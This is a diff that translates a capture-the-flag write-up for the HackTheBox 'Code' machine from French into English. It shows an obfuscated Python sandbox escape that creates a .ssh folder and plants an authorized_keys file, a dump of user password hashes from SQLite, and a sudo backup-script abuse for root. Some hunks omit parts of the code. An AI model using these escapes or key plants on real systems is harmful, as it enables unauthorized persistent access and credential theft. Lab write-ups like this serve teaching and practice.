@@ -1,23 +1,23 @@
-# Challenge CTF: CODE HTB
+# CTF Challenge: CODE HTB
 
-## Exploration Initiale
+## Initial Exploration
 
-Nous remarquons que le port **5000** est ouvert avec le protocole **HTTP**. En y accédant, nous découvrons un compilateur Python en ligne. Nous essayons donc dans un premier temps de lister les classes disponibles avec le script suivant :
+We notice that port **5000** is open with the **HTTP** protocol. When accessing it, we discover an online Python compiler. Our first attempt is to list the available classes using the following script:
 
 ```python
 for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
     print(f"Index {i}: {cls.__name__}")
 ```
 
-Ce script fonctionne et nous renvoie un résultat utile.
+This script works and returns useful results.
 
 ---
 
-## Création d'un accès SSH
+## Creating an SSH Access
 
-Nous constatons que l'utilisateur n'a pas de dossier **.ssh**. Nous allons donc en créer un afin d'établir une connexion SSH ultérieurement.
+We observe that the user does not have a **.ssh** folder. We will create one to establish an SSH connection later.
 
-### Création du dossier `.ssh`
+### Creating the `.ssh` Folder
 
 ```python
 b = (0).__class__.__base__.__subclasses__()[138].__init__.__globals__
@@ -25,7 +25,7 @@ i = b['__bui' + 'ltins__']
 i['__im' + 'port__']('o'+'s').__getattribute__('make' + 'dirs')('/home/app-production/.ssh/')
 ```
 
-### Ajout de notre clé publique SSH
+### Adding Our Public SSH Key
 
 ```python
 f = ''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['__bui'+'ltins__']['op'+'en']('/home/app-production/.ssh/authorized_keys', 'w')
@@ -35,11 +35,11 @@ getattr(f, 'clo'+'se')()
 
 ---
 
-## Accès à la base de données SQLite
+## Accessing the SQLite Database
 
-Nous trouvons des indices dans un fichier de configuration indiquant la présence d'une base de données **SQLite3**.
+We find hints in a configuration file indicating the presence of an **SQLite3** database.
 
-### Localisation de la base de données
+### Locating the Database
 
 ```bash
 app-production@code:~$ find / -name "database.db" 2>/dev/null
@@ -47,7 +47,7 @@ app-production@code:~$ find / -name "database.db" 2>/dev/null
 /home/app-production/instance/database.db
 ```
 
-### Exploration de la base de données
+### Exploring the Database
 
 ```bash
 app-production@code:~$ sqlite3 /home/app-production/app/instance/database.db
@@ -55,14 +55,14 @@ SQLite version 3.31.1 2020-01-27 19:55:54
 Enter ".help" for usage hints.
 ```
 
-#### Récupération des tables disponibles
+#### Retrieving Available Tables
 
 ```sql
 sqlite> .tables
 code  user
 ```
 
-#### Extraction des utilisateurs et mots de passe
+#### Extracting Users and Passwords
 
 ```sql
 sqlite> select * from user;
@@ -71,21 +71,21 @@ sqlite> select * from user;
 3|sojlen|202cb962ac59075b964b07152d234b70
 ```
 
-Nous obtenons ainsi le mot de passe de **Martin**.
+Thus, we obtain **Martin's** password.
 
 ---
 
-## Escalade de Privilèges
+## Privilege Escalation
 
-En nous connectant avec l'utilisateur **Martin**, nous utilisons la commande suivante :
+After logging in as **Martin**, we execute:
 
 ```bash
 martin@code:~$ sudo -l
 ```
 
-Nous découvrons un script **/usr/bin/backy.sh** qui peut être exécuté avec sudo.
+We discover a script **/usr/bin/backy.sh** that can be executed with sudo.
 
-### Contenu du script `backy.sh`
+### Content of `backy.sh`
 
 ```bash
 #!/bin/bash
@@ -130,22 +130,22 @@ done
 /usr/bin/backy "$json_file"
 ```
 
-Nous exploitons une faille dans le script pour exécuter des commandes arbitraires.
+We exploit a flaw in the script to execute arbitrary commands.
 
 ### Exploitation
 
-Nous pouvons utiliser **tar** pour extraire du contenu sensible dans `/home/martin/backup/` :
+We can use **tar** to extract sensitive content into `/home/martin/backup/`:
 
 ```bash
 tar -xvf code
 ```
 
-Cela nous donne accès aux fichiers nécessaires pour obtenir l'accès root.
+This grants us access to the necessary files to gain **root** access.
 
 ---
 
-## Récupération du Flag Root
+## Retrieving the Root Flag
 
-En exploitant la vulnérabilité du script, nous obtenons un accès **root**, nous permettant de lire le fichier **/root/root.txt**.
+By exploiting the script's vulnerability, we obtain **root** access, allowing us to read the **/root/root.txt** file.
 
 
